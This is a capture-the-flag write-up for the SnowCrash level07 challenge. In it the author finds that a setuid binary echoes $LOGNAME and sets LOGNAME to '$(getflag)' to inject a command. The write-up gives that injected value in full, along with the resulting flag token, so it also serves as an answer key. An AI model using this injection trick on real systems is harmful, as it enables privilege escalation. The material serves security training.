Level 07
========

This one was the easiest of all

*	There is no file to be found except the executable that we get in the root
*	First thing I did was to try it
	```console
	level07@SnowCrash:~$ ./level07 
	level07
	```
*	From this point I two options in mind
	*	The program prints the programs arguments starting from 0
	*	The program prints an env variable
*	I tried adding arguments but nothing changed so that's not it
*	So I took a look at `$USER` and tried to change it but nothing changed
	```console
	level07@SnowCrash:~$ export USER=getflag
	level07@SnowCrash:~$ ./level07 
	level07
	```
*	Last option we had was to change the `$LOGNAME`
	```console
	level07@SnowCrash:~$ export LOGNAME=test
	level07@SnowCrash:~$ ./level07 
	test
	```
*	Now the rest is simple, I just need to make it so the program prints the result of `getflag`
	```console
	level07@SnowCrash:~$ export LOGNAME='$(getflag)'
	level07@SnowCrash:~$ ./level07
	Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
	```